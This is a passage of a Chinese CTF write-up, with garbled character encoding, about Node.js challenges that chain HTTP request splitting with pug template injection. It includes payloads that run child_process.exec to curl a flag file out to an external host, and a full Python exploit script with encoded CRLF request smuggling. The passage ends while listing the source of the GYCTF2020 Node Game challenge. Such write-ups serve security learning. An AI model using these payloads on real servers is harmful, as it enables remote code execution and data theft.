&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">host&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">address&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">address&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">address&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">port&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Example app listening at http://%s:%s&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">host&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">port&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¦‚æœä¸Šä¸€ä¸ªé¢˜ä»”ç»†åˆ†æçš„è¯å°±ä¼šå‘ç°è¿™ä¸ªé¢˜åªæ˜¯ä»£ç åšäº†ä¸€äº›å¾®å°çš„æ”¹åŠ¨&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205214720894.png" alt="image-20211205214720894">&lt;/p>
&lt;p>éœ€è¦å¤šæ„é€ ä¸€ä¸ªè¯·æ±‚å¤´ï¼Œæ¢è¡Œçš„CRLFå’Œç©ºæ ¼SPæˆ‘ä»¬ç”¨unicodeï¼Œè€Œpugæ‰§è¡Œå‘½ä»¤çš„éƒ¨åˆ†æˆ‘ä»¬å¯ä»¥ç”¨å…«è¿›åˆ¶å­—ç¬¦&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">[][&lt;/span>&lt;span style="color:#d88200">&amp;#34;constructor&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e">// valid
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">[][&lt;/span>&lt;span style="color:#d88200">&amp;#34;constructor&amp;#34;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#34;constructor&amp;#34;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#34;evalcode&amp;#34;&lt;/span>&lt;span style="color:#111">)()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">[][&lt;/span>&lt;span style="color:#d88200">&amp;#34;\143\157\156\163\164\162\165\143\164\157\162&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e">// valid,executable
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">[][&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">42&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">143&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">157&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">156&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">163&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">164&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">162&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">165&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">143&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">164&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">157&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">162&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">42&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e">// invalid,since &amp;#34; is encoded
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>pugæ¨¡æ¿ä¸¤ç§å½¢å¼&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">#&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#75af00">shellcode&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#75af00">shellcode&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å†™ä¸€ä¸ªå¤–å¸¦flagçš„payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#111">[][&lt;/span>&lt;span style="color:#d88200">&amp;#34;constructor&amp;#34;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#34;constructor&amp;#34;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#34;console.log(this.process.mainModule.require(&amp;#39;child_process&amp;#39;).exec(&amp;#39;curl 172.19.0.1:8888 -X POST -d @flag.txt&amp;#39;))&amp;#34;&lt;/span>&lt;span style="color:#111">)()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ‘æ ¹æ®è¿™ä½å¤§ä½¬çš„py2ç‰ˆ&lt;a href="https://ctftime.org/writeup/18293">exp.py&lt;/a>å†™äº†ä¸€ä¸ªpy3ç‰ˆæœ¬çš„ï¼Œå¹¶ä¸”æ”¹çš„ç®€æ´äº†ä¸€äº›ï¼ˆæœ‰äº†ä¸€äº›é€šç”¨æ€§ï¼Œä½†æ˜¯ç”±äºè¿˜æ˜¯éƒ¨åˆ†unicodeç¼–ç ï¼Œæ€»ä½“ä¸Šä¸å¦‚å…¨ç¼–ç çš„ç¨³&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">requests.utils&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">quote&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">charset&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">SPACE&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">u&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u0120&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">CRLF&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">u&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u010d\u010a&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">SLASH&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">u&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u012f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># ä»…å¯¹å­—æ¯è¿›è¡Œç¼–ç &lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">str2Oct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">oct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">))[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">:]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">i&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;o&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">_pug&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;-[][&amp;#34;constructor][&amp;#34;constructor](&amp;#34;console.log(this.process.mainModule.require(&amp;#39;child_process&amp;#39;).exec(&amp;#39;curl http://ip:port/ -d @/flag.txt&amp;#39;))&amp;#34;)()&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">pug&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str2Oct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">_pug&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;%22&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;%27&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># print(pug)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># print(quote(pug))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;amiz HTTP/1.1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">GET /flag HTTP/1.1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">x-forwarded-for: 127.0.0.1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">adminauth: secretpassword
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">pug: &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">pug&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">test: &amp;#39;&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39; &amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">SPACE&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">SLASH&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">CRLF&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;url&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">content&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æœ¬åœ°å¤ç°æˆåŠŸ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206192539624.png" alt="image-20211206192539624">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206191832996.png" alt="image-20211206191832996">&lt;/p>
&lt;h2 id="gyctf2020node-game">[GYCTF2020]Node Game&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">express&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;express&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;fs&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;path&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">http&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">pug&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;pug&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">morgan&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;morgan&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">multer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;multer&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">multer&lt;/span>&lt;span style="color:#111">({&lt;/span>&lt;span style="color:#75af00">dest&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;./dist&amp;#39;&lt;/span>&lt;span style="color:#111">}).&lt;/span>&lt;span style="color:#75af00">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">morgan&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;short&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span> &lt;span style="color:#75715e">// ç®€åŒ–ç‰ˆæ—¥å¿—
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/uploads&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">static&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;/uploads&amp;#39;&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/template&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">static&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;/template&amp;#39;&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">action&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">action&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">action&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#d88200">&amp;#34;index&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// actionå‚æ•°
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span> &lt;span style="color:#75af00">action&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">includes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#75af00">action&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">includes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;\\&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">){&lt;/span> &lt;span style="color:#75715e">// ä¸èƒ½æœ‰/ \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Errrrr, You have been Blocked&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
